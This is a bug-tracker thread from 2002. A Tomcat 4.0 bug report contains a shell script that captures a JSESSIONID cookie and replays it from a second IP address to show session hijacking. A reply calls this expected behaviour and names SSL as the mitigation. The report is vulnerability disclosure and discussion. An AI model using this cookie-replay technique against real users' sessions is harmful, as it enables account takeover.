[{"count": 0, "attachment_id": null, "bug_id": 12904, "is_private": false, "id": 23226, "time": "2002-09-22T17:32:37Z", "creator": "rcolmegna@tiscalinet.it", "creation_time": "2002-09-22T17:32:37Z", "tags": [], "text": "#!/bin/sh\n\n#\n# Demonstrate a session hijaking against a Jakarta/Tomcat 4.0.3 JSP page.\n# \n# Objective: intrusion in a user-established http session context\n# from another IP through JSESSIONID interception and reuse.\n#\n# Test against:\n#  - a JSP page which increment a session-counter \n#\n# How:\n#  - Execute an HTTP call from an IP address\n#  - Obtain a JSESSION ID\n#  - Execute another HTTP from another IP address reusing JSESSION ID\n#\n# Result:\n#  - The per user session counter have a double increment\n#\n# Defacement:\n#  - The second HTTP request WOULD BE REJECTED due to an unadmissible\n#    source IP/JSESSION ID couple\n#\n# Test environment:\n#   Linux Mandrake 8.1\n#   JVM 1.3.1\n#   Tomcat 4.0.2\n#\n#\n\n# a page which return an auto-incremental number (1 counter per session)\nURL=http://k900:8080/autosc3000/app/jsp/Mytest2.jsp\ncookie=\"x\"\ni=0\n\nwhile : ; do\n  m=$[$i%2]\n\n  if [ $m = \"1\" ]; then\n    address=k900\n  else\n    address=localhost\n  fi\n\n  # HTTP request to tomcat\n  wget --header=\"Cookie: $cookie\" -s --bind-address=$address -O x $URL \\\n    > /dev/null 2>/dev/null\n  echo -n $address\" \"\n  cat x | grep Mytest -A 1 | tail -1\n\n  if [ $cookie = \"x\" ]; then\n    cookie=\"`cat x | grep Set-Cookie | tr \";\" \" \" | awk '{print $2}'`\"\n  fi\n\n  i=$[$i+1]\n  sleep 1\ndone"}, {"count": 1, "tags": [], "creator": "funkman@joedog.org", "attachment_id": null, "is_private": false, "id": 27223, "time": "2002-12-01T23:46:23Z", "bug_id": 12904, "creation_time": "2002-12-01T23:46:23Z", "text": "If I am correct, you are worried that someone may be sniffing the wire and steal\nthe sesion id. \n\nThis is a feature of the spec. To prevent this attack - use SSL. There is\nnothing in the spec which dicates how the session id should be created (AFAIK)\nso locking the sessionid to the requester's ip address could cause weird results.\n "}]